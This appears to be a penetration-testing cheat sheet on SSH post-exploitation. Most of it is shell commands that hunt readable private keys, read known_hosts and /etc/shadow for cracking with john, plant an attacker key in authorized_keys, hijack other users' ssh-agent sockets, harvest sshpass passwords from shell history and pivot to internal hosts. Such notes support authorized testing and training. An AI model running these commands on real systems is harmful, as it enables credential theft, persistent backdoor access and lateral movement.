# SSH keys, agents and logins

Any key, agent or `known_hosts` entry names a next account or host. Record `file | owner | where it works`.

## Find keys and config
```bash
find / -xdev \( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' -o -name '*.pem' -o -name '*.ppk' -o -name 'authorized_keys' \) -readable 2>/dev/null
ls -la ~/.ssh /home/*/.ssh /root/.ssh 2>/dev/null
cat ~/.ssh/config ~/.ssh/known_hosts 2>/dev/null
grep -rl 'BEGIN .*PRIVATE KEY' /home /opt /srv /var/www /var/backups /tmp 2>/dev/null
```
- `config` lists `HostName`, `User`, `IdentityFile`: ready-made targets. `known_hosts` lists hosts the user connected to (hashed entries: test candidate hosts with `ssh-keygen -F <HOST>`).
- Backups (`*.bak`, `*.old`, `~`, tarballs) hold keys that were removed from the live path.

## Use a key
```bash
chmod 600 id_rsa
ssh -i id_rsa <USER>@<IP>
ssh-keygen -y -f id_rsa            # prints the public key; asks for the passphrase if protected
```
| Problem | Check |
| --- | --- |
| `Load key ... invalid format` | Missing trailing newline, DOS line endings, or copy-paste wrapped lines; the `-----BEGIN` / `-----END` lines must be intact |
| `Permissions 0644 ... are too open` | `chmod 600` |
| Passphrase prompt | `ssh2john id_rsa > h` → `john` ([cracking](../passwords/cracking.md#john)) |
| Key accepted for another user | Try it for every local user and every host in `known_hosts`/`config`: the owner of the file is not always the login |
| Permission denied (publickey) | Wrong user, `PubkeyAcceptedAlgorithms` (old RSA/SHA-1 key → `-o PubkeyAcceptedAlgorithms=+ssh-rsa`), key not in `authorized_keys`, `AllowUsers` |
| `PermitRootLogin` | `grep -Ei 'PermitRootLogin|AllowUsers|PasswordAuth' /etc/ssh/sshd_config` |

## Plant your own key
You can write as a user or root (file write, sudo editor, NFS, upload traversal):

```bash
ssh-keygen -t ed25519 -f ./key -N ''
cat key.pub                                     # append this line
```
Target:
```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo '<PUBLIC-KEY-LINE>' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
```bash
ssh -i key <USER>@<IP>
```
- `sshd` ignores the file if the home, `.ssh` or the file is group/world-writable or has the wrong owner. `StrictModes yes` default.
- Writing as root into another user's home: `chown <USER>: ~/.ssh ~/.ssh/authorized_keys`.
- Remove your line afterwards.

## Agent hijacking
Another user's agent (root, or a user with sudo to the same account) forwards their keys.

```bash
ps aux | grep ssh-agent
ls -la /tmp/ssh-*/ 2>/dev/null
env | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-<RANDOM>/agent.<PID> ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-<RANDOM>/agent.<PID> ssh <USER>@<HOST>
```
- Needs read/write on the socket: usually you are the same user or root. Forwarded agents (`ssh -A` into this host) show up as `/tmp/ssh-*/agent.*` of the connecting user.
- Multiplexed connections: `ls -la ~/.ssh/cm_socket* /tmp/ssh-*`, `ControlPath` in `config` → `ssh -S <SOCKET> <HOST>`.

## Credentials from login-related files
```bash
cat /etc/passwd | grep -v nologin
ls -la /etc/shadow /etc/shadow- /var/backups/ 2>/dev/null
grep -iE 'sshpass|ssh .*-i|scp ' ~/.bash_history /home/*/.bash_history 2>/dev/null
```
- Readable `/etc/shadow` or a backup copy → `unshadow` + `john` ([cracking](../passwords/cracking.md#etcshadow)).
- `sshpass -p '<PW>' ssh ...` in scripts or history = cleartext password.
- Local `su <USER>` with a found password: `su - <USER>`; also try the password for the same name on the other hosts ([service triage](../enum/service-triage.md)).

## From a foothold, onward
- Keys/hosts found → internal hosts: [pivoting](../06-pivoting.md) (`ssh -L/-D/-J`), then repeat [recon](../01-recon.md) through the route.
- Two hops: `ssh -J <USER>@<PIVOT> <USER2>@<INTERNAL>`; port forward with `-L` added: [SSH and Socat](../pivoting/ssh-socat.md).
